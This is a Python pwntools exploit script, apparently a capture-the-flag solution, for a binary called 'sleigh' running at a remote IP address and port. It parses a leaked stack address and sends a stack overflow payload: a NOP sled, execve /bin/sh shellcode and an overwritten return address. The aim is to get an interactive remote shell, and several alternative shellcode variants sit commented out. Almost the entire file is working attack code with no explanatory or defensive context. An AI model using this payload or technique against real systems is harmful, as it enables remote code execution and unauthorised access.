from pwn import *
import re, os
from struct import *

elf = context.binary = ELF("./sleigh", checksec=False)
ip = "138.68.183.216"
port = 31851

#s = process('./sleigh')
s = remote(ip, port)

#shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
#shellcode = b'\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\xe6\x48\x83\xc0\x3b\x0f\x05'[::-1]
#shellcode = b'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'[::-1]
#shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

print(len(shellcode))

junk = b'\x90' * (72 - len(shellcode) - 16)
junk2 = b'A' * (8)

s.send("1".encode())

response = s.recv().decode()
response = s.recv().decode()

rsi = re.search('\[(.*)\]', response).group(1)[-14:]
print(rsi)
print(hex(int(rsi, 0)+80))
#rsi = "0x0000" + rsi
rsi = pack('<Q', (int(rsi, 0)))

payload = junk
payload += shellcode
payload += junk2
payload += rsi
payload += rsi

log.info("Payload: {}".format(payload))

open('payload.txt', 'wb').write(payload)

s.send(payload)

#s.close()

try:
    s.interactive()
except:
    print("rip in piece")

try:
    core = s.corefile
    print("rsp: ",end='')
    print(hex(core.rsp))
    print("rsi: ",end='')
    print(hex(core.rsi))
    print("rbp: ",end='')
    print(hex(core.rbp))
    print("rip: ",end='')
    print(hex(core.rip))
except:
    print("program didn't crash i guess")
